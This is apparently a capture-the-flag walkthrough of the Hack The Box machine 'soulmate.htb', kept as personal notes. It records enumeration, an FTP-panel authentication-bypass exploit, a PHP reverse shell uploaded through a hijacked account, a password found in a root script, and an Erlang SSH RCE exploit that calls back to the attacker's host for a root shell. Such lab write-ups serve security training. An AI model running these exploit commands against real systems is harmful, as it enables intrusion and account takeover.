### Nmap
```bash
nmap -sV -sC -vv 10.10.11.86

--OUTPUT--
Nmap scan report for 10.10.11.86                                                                                           
Host is up, received reset ttl 63 (0.022s latency).                                                                        
Scanned at 2025-12-03 14:15:24 EST for 7s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Port 80
- Add to `/etc/hosts` : `soulmate.htb`
![[Pasted image 20251203141831.png]]

- I proceed to try and signup:
![[Pasted image 20251203141914.png]]

- Create user `test:testtest`
![[Pasted image 20251203141957.png]]

- I logni as user:
![[Pasted image 20251203142024.png]]

- I see it redirects me to `profile.php` 
- I am thinking the image upload could be injectable
- Uploading a gif I can find the source but its saved as a file with the time of day set which is not in sync with my machine.


- Going back I find aonther site enumerating port 80
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://soulmate.htb/ -H 'Host: FUZZ.soulmate.htb' -fs 154

---OUTPUT---

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1333 req/sec :: Duration: [0:00:58] :: Errors: 0 ::

```

![[Pasted image 20251203153932.png]]

- Checking `ftp.soulmate.htb` after adding to `/etc/hosts`
![[Pasted image 20251203154736.png]]

- Looking online and on searchsploit I see an exploir:
![[Pasted image 20251203180216.png]]
- I try the authentication bypass exploit:
```
python3 52295.py --target ftp.soulmate.htb --port 80 --new-user admin --password admin1234 --exploit
```
- I then login with those credentials to get admin access
![[Pasted image 20251203181848.png]]
- Looking around I find some other users with their shared folders
	- Admin > User Manager > ben > webProd directory
![[Pasted image 20251203182115.png]]
- I find a user ben with the folder for the website `soulmate.htb` and change his password to `testtest`
- I then login to the platform with `ben`'s credentials
- I select webProd and click Add Files to add my php reverse shell:
![[Pasted image 20251203182257.png]]

- On accessing `http://soulmate.htb/php-reverse-shell.php` on the browser I catch a shell on my listener (and make a better shell):
![[Pasted image 20251203182513.png]]

- I find theres a user ben and im user `www-data`. Looking at ps -aux or linpeas I see this output:
![[Pasted image 20251203182718.png]]
```
/usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```
- this was a process run by root.
- On reading the start.escript file I find a password for ben:
![[Pasted image 20251203182842.png]]

- I can switch to user ben with these credentials `ben:HouseH0ldings998`
- Looking further we see it is some ssh service running on port 2222 and furthermore this file is owned by root.
- I grab user flag as user ben:
![[Pasted image 20251203183118.png]]

- I check open ports 
```bash
ss -tlnp
```
![[Pasted image 20251203183201.png]]
- I see port 2222 is running locally. I try to catch it with nc command and get an output:
![[Pasted image 20251203183241.png]]

- Looking online I find an exploit for Erlang SSH:
	- https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
- I copy this code in the target and run it :
```
python3 exploit.py 127.0.0.1 -p 2222 --shell --lhost 10.10.14.47 --lport 9999
```
![[Pasted image 20251203183811.png]]
- I get a slightly better shell and grab the root flag:
```
script /dev/null -c bash
```
![[Pasted image 20251203183921.png]]